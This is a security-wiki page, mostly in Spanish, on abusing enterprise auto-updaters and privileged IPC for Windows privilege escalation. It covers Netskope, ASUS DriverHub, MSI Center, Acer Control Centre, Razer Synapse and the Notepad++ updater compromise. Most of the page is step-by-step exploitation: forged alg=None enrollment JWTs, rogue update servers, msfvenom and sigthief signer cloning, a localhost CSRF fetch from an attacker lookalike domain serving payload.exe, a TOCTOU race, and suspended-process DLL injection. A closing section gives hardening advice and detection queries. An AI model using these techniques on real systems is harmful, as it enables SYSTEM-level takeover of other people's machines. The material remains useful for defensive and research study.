# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada local de privilegios en Windows encontradas en agentes endpoint empresariales y updaters que exponen una superficie IPC de baja fricción y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client for Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar el enrollment hacia un servidor controlado por el atacante y luego entregar un MSI malicioso que el servicio SYSTEM instala.

Ideas clave que puedes reutilizar contra productos similares:
- Abusa del IPC localhost de un servicio privilegiado para forzar re-enrollment o reconfiguración hacia un servidor del atacante.
- Implementa los update endpoints del vendor, entrega una Trusted Root CA rogue y apunta el updater a un paquete malicioso, “signed”.
- Evasión de comprobaciones débiles de signer (CN allow-lists), banderas de digest opcionales y propiedades laxas de MSI.
- Si el IPC está “encrypted”, deriva la key/IV de identificadores de máquina legibles por todos almacenados en el registry.
- Si el servicio restringe los callers por image path/process name, inyecta en un proceso allow-listed o lanza uno suspended y arranca tu DLL mediante un parche mínimo del thread-context.

---
## 1) Forzar el enrollment hacia un servidor del atacante mediante localhost IPC

Muchos agentes incluyen un proceso UI en modo usuario que se comunica con un servicio SYSTEM sobre localhost TCP usando JSON.

Observado en Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo de explotación:
1) Construye un token JWT de enrollment cuyos claims controlen el backend host (por ejemplo, AddonUrl). Usa alg=None para que no se requiera firma.
2) Envía el mensaje IPC invocando el comando de provisioning con tu JWT y el nombre del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio empieza a hacer requests a tu rogue server para enrollment/config, por ejemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del caller es basada en path/name, origina la request desde un binary de vendor allow-listed (ver §4).

---
## 2) Secuestrando el update channel para ejecutar code como SYSTEM

Una vez que el client habla con tu server, implementa los endpoints esperados y redirígelo a un MSI del attacker. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve JSON config con un updater interval muy corto, por ejemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado PEM CA. El servicio lo instala en el almacén Trusted Root de Local Machine.
3) /v2/checkupdate → Proporciona metadata que apunta a un MSI malicioso y una versión falsa.

Bypassing common checks seen in the wild:
- Signer CN allow-list: el servicio puede comprobar solo que el Subject CN sea “netSkope Inc” o “Netskope, Inc.”. Tu rogue CA puede emitir un leaf con ese CN y firmar el MSI.
- CERT_DIGEST property: incluye una propiedad MSI benigna llamada CERT_DIGEST. No hay enforcement en la instalación.
- Optional digest enforcement: la config flag (por ejemplo, check_msi_digest=false) desactiva la validación criptográfica extra.

Result: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
ejecutando código arbitrario como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza una rogue CA, la firma de un MSI malicioso, y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerar candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extrae datos de routing respaldados por el registro usados por servidores IPC basados en plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrae primero los nombres de endpoints, las claves JSON y los command IDs del client en user-mode. Los frontends empaquetados de Electron/.NET con frecuencia exponen todo el schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Busca el predicado de confianza real, no solo la ruta de código que eventualmente lanza el proceso:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrones que vale la pena priorizar:
- `CryptQueryObject`/analizar certificados sin `WinVerifyTrust` normalmente significa que “el certificado existe” fue tratado como “el certificado es confiable”, lo que permite clonación de certificados u otros trucos de fake-signer.
- Las comprobaciones de substring/suffix sobre `Origin`, `Referer`, URLs de descarga, nombres de proceso o CNs del firmante no son autenticación. `contains(".vendor.com")` suele ser explotable con dominios de parecido controlados por el atacante.
- Si el GUI de bajo privilegio decide “el archivo es confiable” y el broker SYSTEM solo consume ese resultado, parchear o reimplementar el DLL/JS del lado cliente a menudo evita por completo el boundary (validación dividida estilo Razer).
- Si el broker copia un payload a `%TEMP%`/`C:\Windows\Temp` y luego lo valida o lo programa desde esa ruta, prueba de inmediato ventanas de reemplazo TOCTOU y módulos de plugin hermanos que expongan wrappers alternativos `ExecuteTask()` con comprobaciones más débiles.

Para objetivos con mucho named-pipe, PipeViewer es una forma rápida de detectar DACLs débiles y pipes accesibles remotamente antes de empezar a reversar el protocolo en profundidad.

Si el objetivo autentica a los callers solo por PID, image path o nombre de proceso, trátalo como un tropiezo y no como un boundary: inyectar en el cliente legítimo, o hacer la conexión desde un proceso allow-listed, suele bastar para satisfacer las comprobaciones del servidor. Para named pipes específicamente, [esta página sobre client impersonation and pipe abuse](named-pipe-client-impersonation.md) cubre el primitive con más detalle.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub incluye un servicio HTTP en modo usuario (ADU.exe) en 127.0.0.1:53000 que espera llamadas del navegador provenientes de https://driverhub.asus.com. El filtro de origin simplemente aplica `string_contains(".asus.com")` sobre el encabezado Origin y sobre las URLs de descarga expuestas por `/asus/v1.0/*`. Cualquier host controlado por el atacante, como `https://driverhub.asus.com.attacker.tld`, pasa la comprobación y puede emitir solicitudes que cambian estado desde JavaScript. Consulta [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para patrones adicionales de bypass.

Flujo práctico:
1) Registra un dominio que incruste `.asus.com` y hospeda allí una página web maliciosa.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (p. ej., `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el cuerpo JSON esperado por el handler: el JS frontend empaquetado muestra el esquema abajo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Incluso la CLI de PowerShell que se muestra abajo tiene éxito cuando el encabezado Origin se falsifica con el valor de confianza:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Cualquier visita del navegador al sitio del atacante se convierte, por tanto, en un local CSRF de 1 clic (o 0 clics vía `onload`) que activa un helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los cachea en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica de substring, así que `http://updates.asus.com.attacker.tld:8000/payload.exe` es aceptada. Después de la descarga, ADU.exe solo comprueba que el PE contenga una signature y que la cadena Subject coincida con ASUS antes de ejecutarlo – sin `WinVerifyTrust`, sin validación de chain.

Para weaponize el flujo:
1) Crea un payload (p. ej., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona el signer de ASUS en él (p. ej., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Aloja `pwn.exe` en un dominio similar a `.asus.com` y dispara UpdateApp vía el browser CSRF de arriba.

Como tanto el Origin como los filtros de URL están basados en substring y la comprobación del signer solo compara strings, DriverHub descarga y ejecuta el binario del atacante bajo su contexto elevado.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP donde cada frame es `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su handler:
1) Copia el ejecutable suministrado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la signature mediante `CS_CommonAPI.EX_CA::Verify` (el certificate subject debe ser “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una tarea programada que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no queda bloqueado entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar Frame A apuntando a un binario legítimo firmado por MSI (garantiza que la comprobación de signature pase y que la tarea quede en cola).
- Competir contra eso con mensajes Frame B repetidos que apunten a un payload malicioso, sobrescribiendo `MSI Center SDK.exe` justo después de que termine la verificación.

Cuando el scheduler se activa, ejecuta el payload sobrescrito como SYSTEM a pesar de haber validado el archivo original. Una explotación fiable usa dos goroutines/threads que saturan `CMD_AutoUpdateSDK` hasta ganar la ventana TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado en `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de un frame seleccionan ese componente, permitiendo a los atacantes dirigir comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios task runners. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` **sin signature validation** – cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución SYSTEM de forma determinista.
- Capturar el loopback con Wireshark o instrumentar los binarios .NET en dnSpy revela rápidamente el mapeo Component ↔ command; luego, clientes personalizados en Go/ Python pueden reproducir los frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clientes remotos (p. ej., `\\TARGET\pipe\treadstone_service_LightMode`). Enviar el command ID `7` con una file path invoca la rutina del servicio que lanza procesos.
- La client library serializa un byte terminador mágico (113) junto con args. La instrumentación dinámica con Frida/`TsDotNetLib` (ver [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para tips de instrumentación) muestra que el handler nativo mapea este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un integrity SID antes de llamar a `CreateProcessAsUser`.
- Sustituir 113 (`0x71`) por 114 (`0x72`) cae en la rama genérica que conserva el token completo de SYSTEM y establece un high-integrity SID (`S-1-16-12288`). El binario lanzado se ejecuta, por tanto, como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combínalo con el flag expuesto del instalador (`Setup.exe -nocheck`) para levantar ACC incluso en VMs de laboratorio y probar el pipe sin hardware del fabricante.

Estos bugs de IPC resaltan por qué los servicios localhost deben imponer autenticación mutua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) y por qué cada helper de “run arbitrary binary” de cada módulo debe compartir las mismas verifications de signer.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 añadió otro patrón útil a esta familia: un usuario con pocos privilegios puede pedir a un helper COM que lance un proceso mediante `RzUtility.Elevator`, mientras la decisión de trust se delega a una DLL en user-mode (`simple_service.dll`) en lugar de aplicarse de forma robusta dentro del boundary privilegiado.

Camino de explotación observado:
- Instanciar el objeto COM `RzUtility.Elevator`.
- Llamar a `LaunchProcessNoWait(<path>, "", 1)` para solicitar un lanzamiento elevado.
- En el PoC público, el gate de PE-signature dentro de `simple_service.dll` se parchea antes de emitir la request, lo que permite lanzar un ejecutable arbitrario elegido por el atacante.

Invocación mínima de PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Takeaway general: al reversar suites “helper”, no te detengas en localhost TCP o named pipes. Busca COM classes con nombres como `Elevator`, `Launcher`, `Updater`, o `Utility`, luego verifica si el servicio privilegiado realmente valida el binary objetivo o simplemente confía en un resultado calculado por una user-mode client DLL parcheable. Este patrón se generaliza más allá de Razer: cualquier diseño split donde el broker de alto privilegio consume una decisión allow/deny desde la parte de bajo privilegio es un candidato a superficie de privesc.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Entre June 2025 y December 2025, attackers que comprometieron la infraestructura de hosting detrás del flujo de update de Notepad++ sirvieron selectivamente manifests maliciosos a víctimas elegidas. Los updaters antiguos basados en WinGUp no verificaban completamente la autenticidad del update, así que una respuesta XML hostil podía redirigir clientes a URLs controladas por el attacker. Como el client aceptaba contenido HTTPS sin imponer tanto una trusted certificate chain como una valid PE signature en el installer descargado, las víctimas descargaron y ejecutaron un NSIS `update.exe` troyanizado.

Operational flow (no local exploit required):
1. **Infrastructure interception**: comprometer CDN/hosting y responder a las comprobaciones de update con metadata del attacker apuntando a una malicious download URL.
2. **Trojanized NSIS**: el installer descarga/ejecuta un payload y abusa de dos execution chains:
- **Bring-your-own signed binary + sideload**: empaqueta el signed Bitdefender `BluetoothService.exe` y deja caer un malicious `log.dll` en su search path. Cuando se ejecuta el signed binary, Windows hace sideload de `log.dll`, que decrypts y reflective loads the Chrysalis backdoor (Warbird-protected + API hashing para dificultar la detección estática).
- **Scripted shellcode injection**: NSIS ejecuta un compiled Lua script que usa Win32 APIs (p. ej., `EnumWindowStationsW`) para inyectar shellcode y stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Impone **certificate + signature verification** del installer descargado (pin vendor signer, rechaza CN/chain que no coincidan) y firma el update manifest en sí (p. ej., XMLDSig). Bloquea redirecciones controladas por el manifest salvo que estén validadas.
- Trata **BYO signed binary sideloading** como un pivot de detección post-download: alerta cuando un signed vendor EXE carga un nombre de DLL desde fuera de su canonical install path (p. ej., Bitdefender cargando `log.dll` desde Temp/Downloads) y cuando un updater deja/ejecuta installers desde temp con non-vendor signatures.
- Monitoriza **malware-specific artifacts** observados en esta cadena (útiles como generic pivots): mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` en `%TEMP%`, y stages de shellcode injection impulsados por Lua.
- Notepad++ respondió reforzando WinGUp en v8.8.9 y posteriores: el XML devuelto ahora va signed (XMLDSig), y las builds más nuevas imponen certificate + signature verification del installer descargado en lugar de confiar solo en el transport.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lanzando un instalador que no es de Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Estos patrones se generalizan a cualquier updater que acepte manifests no firmados o falle al fijar los firmantes del installer—network hijack + malicious installer + BYO-signed sideloading da lugar a remote code execution bajo la apariencia de actualizaciones “trusted”.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
